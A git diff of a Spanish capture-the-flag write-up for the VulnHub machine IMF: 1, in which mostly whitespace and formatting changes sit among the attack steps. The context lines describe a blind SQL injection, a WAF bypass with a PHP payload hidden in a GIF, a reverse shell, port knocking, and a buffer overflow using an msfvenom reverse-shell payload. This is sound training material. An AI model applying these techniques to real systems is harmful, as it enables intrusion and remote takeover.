@@ -19,7 +19,7 @@ references:
 
 **IMF: 1** es una máquina ***Boot2Root*** de dificultad moderada alojada en [VulnHub](https://www.vulnhub.com/), diseñada para **simular** el entorno de una agencia de inteligencia ficticia ("Impossible Mission Force"). A diferencia de los CTF tradicionales, el reto destaca por integrar múltiples flags progresivas, donde cada una revela la pista necesaria para la siguiente etapa.
 
- Este writeup documenta el proceso de auditoría completo, desde el reconocimiento inicial hasta la explotación de binarios en bajo nivel. La auditoria comienza con la enumeración web para descubrir puntos de entrada ocultos, evoluciona a través de una inyección **SQLi Boolean-Based Blind** para la exfiltración de credenciales, y culmina en el análisis de un servicio personalizado vulnerable a **Buffer Overflow**, permitiendo la ejecución remota de código y la escalada final de privilegios.
+Este writeup documenta el proceso de auditoría completo, desde el reconocimiento inicial hasta la explotación de binarios en bajo nivel. La auditoria comienza con la enumeración web para descubrir puntos de entrada ocultos, evoluciona a través de una inyección **SQLi Boolean-Based Blind** para la exfiltración de credenciales, y culmina en el análisis de un servicio personalizado vulnerable a **Buffer Overflow**, permitiendo la ejecución remota de código y la escalada final de privilegios.
  
 ---
 ## Objetivos
@@ -33,14 +33,14 @@ references:
 > 
 > **Antes de continuar:** Lee mi nota "**[[Ética en la Ciberseguridad]]**" para más información. 
 ## Técnicas Aplicadas
-- **Reconocimiento de Red**: Identificación de objetivos mediante ARP y TCP  
-- **Enumeración de Servicios**: Detección de versiones y aplicaciones  
-- **Análisis Manual de Código**: Identificación de secretos en código fuente  
-- **SQL Injection Boolean-Based**: Automatización de explotación  
-- **Bypass de WAF**: Inserción de payloads en archivos GIF  
-- **Reverse Shell**: Obtención de acceso remoto  
-- **Port Knocking**: Acceso a servicios protegidos  
-- **Buffer Overflow**: Escalada de privilegios  
+- **Reconocimiento de Red**: Identificación de objetivos mediante ARP y TCP
+- **Enumeración de Servicios**: Detección de versiones y aplicaciones
+- **Análisis Manual de Código**: Identificación de secretos en código fuente
+- **SQL Injection Boolean-Based**: Automatización de explotación
+- **Bypass de WAF**: Inserción de payloads en archivos GIF
+- **Reverse Shell**: Obtención de acceso remoto
+- **Port Knocking**: Acceso a servicios protegidos
+- **Buffer Overflow**: Escalada de privilegios
 ### Entorno de Trabajo
 Este writeup fue realizado bajo las siguientes condiciones:
 - **Hipervisor**: VMware Workstation Pro
@@ -191,8 +191,7 @@ Además, en su código fuente encontramos la `flag1{YWxsdGhlZmlsZXM=}`. Vemos qu
 echo "YWxsdGhlZmlsZXM=" | base64 -d; echo
 ```
 ![[IMF-14.webp]]
-Resultado: **allthefiles** - Pista que nos sugiere revisar todos los archivos.
-Recuento de Información:
+Resultado: **allthefiles** - Pista que nos sugiere revisar todos los archivos. Recuento de Información:
 
 > [!success] Flags Capturadas: 
 > - `flag1{allthefiles}`
@@ -248,7 +247,7 @@ No hay nada interesante en los códigos fuentes de estas páginas a simple vista
 
 ### 3.1 Identificación de la Vulnerabilidad
 
-Nos damos cuenta de que la página tiene un parámetro interesante: `cms.php?pagename=home`. 
+Nos damos cuenta de que la página tiene un parámetro interesante: `cms.php?pagename=home`.
 
 ![[IMF-23.webp]]
 Ese `=` es bastante curioso ya que está apuntando a recursos, por lo que vamos a probar colocando una comilla `'` (comilla simple). Esto nos da una pantalla **WARNING** de **SQL**, confirmando que hay una inyección SQL:
@@ -300,7 +299,7 @@ mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in
 
 #### Confirmación de Boolean SQLi
 
-Con esto podemos identificar que hay una base de datos trabajando con SQL, ademas vemos ese **bolean given in** es un claro indicio a que hay un error relacionado a parámetros booleanos, teniendo esto en cuenta vamos a probar los payload: dando el servidor respuestas distintas y confirmando **boolean sqli** 
+Con esto podemos identificar que hay una base de datos trabajando con SQL, ademas vemos ese **bolean given in** es un claro indicio a que hay un error relacionado a parámetros booleanos, teniendo esto en cuenta vamos a probar los payload: dando el servidor respuestas distintas y confirmando **boolean sqli**
 
 hora probamos dos payloads específicos para confirmar el comportamiento booleano:
 
@@ -419,8 +418,7 @@ En esta sección vemos que se pueden subir documentos, sin embargo la gran mayor
    
 Necesitamos **bypassear el WAF** (Web Application Firewall).
 
-**Magic Numbers (File Signatures)**:
-Los magic numbers (también llamados file signatures) son bytes específicos al inicio de un archivo que identan su tipo. Por ejemplo:
+**Magic Numbers (File Signatures)**: Los magic numbers (también llamados file signatures) son bytes específicos al inicio de un archivo que identan su tipo. Por ejemplo:
 - **PNG**: `89 50 4E 47` (`PNG` en hexadecimal)
 - **JPEG**: `FF D8 FF E0`
 - **GIF**: `47 49 46 38` (`GIF8` en hexadecimal)
@@ -454,7 +452,7 @@ Los backticks en PHP ejecutan comandos del sistema, es una alternativa a `system
 
 ### 5.4 Subida del Archivo
 
-Subimos `script.gif` desde el formulario de `uploadr942.php` modificando la solicitud con BurpSuite para que incluya lo que queremos que el WAF valide. 
+Subimos `script.gif` desde el formulario de `uploadr942.php` modificando la solicitud con BurpSuite para que incluya lo que queremos que el WAF valide.
 
 Modificamos para el WAF:
 - ✅ Extensión: `.gif` (permitido)
@@ -529,8 +527,7 @@ Una vez que tenemos conexión reverse, la shell es inestable. Procedemos a estab
 /usr/bin/script -qc /bin/bash /dev/null
 ```
 
-**Paso 2: Suspender el proceso**
-Presionamos `Ctrl+Z` para suspender la shell.
+**Paso 2: Suspender el proceso** Presionamos `Ctrl+Z` para suspender la shell.
 
 **Paso 3: Reconfigurar terminal**
 ```bash
@@ -570,7 +567,7 @@ find / -perm -4000 2>/dev/null
 netstat -tuln
 ```
 
-En el resultado del `ps aux` se puede observar que, aparte de los procesos estándar de sistema, existe el proceso `/usr/sbin/knockd` corriendo como root. 
+En el resultado del `ps aux` se puede observar que, aparte de los procesos estándar de sistema, existe el proceso `/usr/sbin/knockd` corriendo como root.
 ![[IMF-42.webp]]
 Esto es muy relevante porque **knockd es un demonio especialmente usado para port knocking**, una técnica que sirve para proteger servicios sensibles permitiendo la apertura de puertos solo tras recibir una secuencia correcta de "golpes" en puertos definidos.
 
@@ -591,7 +588,7 @@ find / -name "*agent*" 2>/dev/null
 Encontramos que existe `/usr/local/bin/agent`. Al ejecutarlo vemos que espera un ID:
 ![[IMF-45.webp]]
 
-Dentro del mismo directorio encontramos un archivo llamado `access_codes` que contiene: `SYN 7482,8279,9467`. Esto es una clara referencia al Port Knocking que comentamos anteriormente. 
+Dentro del mismo directorio encontramos un archivo llamado `access_codes` que contiene: `SYN 7482,8279,9467`. Esto es una clara referencia al Port Knocking que comentamos anteriormente.
 
 
 ![[IMF-46.webp]]
@@ -738,10 +735,9 @@ pattern search 0x62616172
 ![[IMF-53.webp]]
 **¡El offset es exactamente 168 bytes!**
 
-Vemos también que el buffer comienza en `0xffffd614` - donde nuestro shellcode residirá inicialmente:
-`0xffffd614  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"`
+Vemos también que el buffer comienza en `0xffffd614` - donde nuestro shellcode residirá inicialmente: `0xffffd614  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"`
 ![[IMF-54.webp]]
-Por lo tanto, si queremos sobrescribir el EIP, necesitamos exactamente **168 bytes de relleno + 4 bytes con la dirección deseada**. 
+Por lo tanto, si queremos sobrescribir el EIP, necesitamos exactamente **168 bytes de relleno + 4 bytes con la dirección deseada**.
 ### 7.4 Obtención de la Dirección de Retorno (0x08048563)
 
 Ahora sabemos que en offset 168 está el EIP. ¿Dónde colocamos nuestro shellcode? La respuesta es **apuntamos el EIP a una instrucción que ejecute nuestro código**.
@@ -775,9 +771,9 @@ msfvenom -p linux/x86/shell_reverse_tcp \
 - `LPORT`: Puerto donde escucharemos
 - `-f python`: Formato de salida (código Python directo)
 - `-b`: Bytes a evitar (badchars):
-  - `\x00`: Null bytes (terminan strings en C)
-  - `\x0a`: Newline (interfiere con entrada)
-  - `\x0d`: Carriage return (problemas de parsing)
+- `\x00`: Null bytes (terminan strings en C)
+- `\x0a`: Newline (interfiere con entrada)
+- `\x0d`: Carriage return (problemas de parsing)
 
 ![[IMF-56.webp]]
 
